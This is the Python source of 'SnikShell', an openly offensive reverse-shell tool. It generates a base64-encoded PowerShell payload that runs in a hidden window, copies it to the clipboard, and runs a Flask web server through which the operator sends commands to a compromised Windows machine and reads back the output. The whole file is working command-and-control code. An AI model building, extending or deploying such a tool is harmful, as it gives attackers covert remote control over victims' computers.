import argparse, requests, base64, threading, flask, waitress, os, time

BLUE = "\033[0;38;5;12m"
ORANGE = "\033[0;38;5;214m"
GREEN = "\033[0;38;5;10m"
RED = "\033[1;31m"
END = "\033[0m"
BOLD = "\033[1m"
INFO = f"[ {ORANGE}INFO{END} ]"

class SnikShell():
    def __init__(self):
        self.clear_console()
        self.session = os.urandom(8).hex()
        self.shell = None
        self.command = None
        parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument("-s", "--server-ip", action="store")
        args = parser.parse_args()
        self.port = 8080

        if args.server_ip:
            self.ip = args.server_ip
            if ":" in args.server_ip:
                self.ip = args.server_ip.split(":")[0]
                self.port = args.server_ip.split(":")[-1]
        else:
            self.ip = requests.get("https://api.ipify.org").text

        self.show_banner()
        print(f"{INFO}: SnikShell v0.2")
        print(f"{INFO}: Generating reverse shell payload...")
        self.payload = self.generate_payload()
        print(f"\n{BOLD}{BLUE}{self.payload}{END}\n")
        print(f"{INFO}: Payload copied to clipboard")
        os.system(f"echo {self.payload} | clip")
        threading.Thread(target=self.start_webserver).start()

    def clear_console(self):
        if(os.name == "posix"):
            os.system("clear")
        else:
            os.system("cls")

    def attach_shell(self):
        while True:
            command = input(f"{BLUE}{BOLD}PS {self.shell} > {END}")
            if command:
                if command == "cls" or command == "clear":
                    self.clear_console()
                    self.attach_shell()
                elif command == "exit":
                    os._exit(0)
                else:
                    self.command = command
                    self.executed = False
                    while not self.executed:
                        pass

    def get_command(self):
        command = self.command
        self.command = None
        return command

    def start_webserver(self):
        app = flask.Flask(__name__)

        @app.get("/connect")
        def connect():
            try:
                if flask.request.headers["Authorization"] == self.session:
                    print(f"{INFO}: Connected to shell")
                    time.sleep(1)
                    print(f"{INFO}: Attaching shell...")
                    time.sleep(2)
                    self.command = "(Resolve-Path .\).Path"
                    self.clear_console()
                    return "connected"
                else:
                    return "auth_error"
            except:
                return "connect_error"

        @app.get("/input")
        def input():
            try:
                if flask.request.headers["Authorization"] == self.session:
                    command = self.get_command()
                    if command:
                        return command
                    else:
                        return "none"
                else:
                    return "auth_error"
            except:
                return "input_error"

        @app.post("/output")
        def output():
            try:
                if flask.request.headers["Authorization"] == self.session:
                    command_output = flask.request.json
                    if not self.shell:
                        self.shell = command_output["Path"].strip()
                        threading.Thread(target=self.attach_shell).start()
                    else:
                        if command_output["Content"].strip():
                            if not command_output["Content"].strip() == "none":
                                self.shell = command_output["Path"].strip()
                                print(f"{command_output['Content'].strip()}")

                        self.executed = True

                    return "succes"
                else:
                    return "auth_error"
            except:
                return "output_error"
        
        print(f"{INFO}: Webserver listening on {self.ip}:{self.port}")
        waitress.serve(app, host="0.0.0.0", port=self.port)

    def generate_payload(self):
        payload = open("payload.ps1", "r").read().strip("\n").replace("*URI*", f"http://{self.ip}:{self.port}").replace("*AUTH*", self.session)
        return "powershell -WindowStyle hidden -e " + base64.b64encode(payload.encode("utf-16")[2:]).decode()

    def show_banner(self):
        print(GREEN + """
     
  ███████╗ ███╗   ██╗ ██╗ ██╗  ██╗   ███████╗ ██╗  ██╗ ███████╗ ██╗      ██╗     
  ██╔════╝ ████╗  ██║ ██║ ██║ ██╔╝   ██╔════╝ ██║  ██║ ██╔════╝ ██║      ██║     
  ███████╗ ██╔██╗ ██║ ██║ █████╔╝    ███████╗ ███████║ █████╗   ██║      ██║     
  ╚════██║ ██║╚██╗██║ ██║ ██╔═██╗    ╚════██║ ██╔══██║ ██╔══╝   ██║      ██║     
  ███████║ ██║ ╚████║ ██║ ██║  ██╗   ███████║ ██║  ██║ ███████╗ ███████╗ ███████╗
  ╚══════╝ ╚═╝  ╚═══╝ ╚═╝ ╚═╝  ╚═╝   ╚══════╝ ╚═╝  ╚═╝ ╚══════╝ ╚══════╝ ╚══════╝         

        """ + END)

shell = SnikShell()
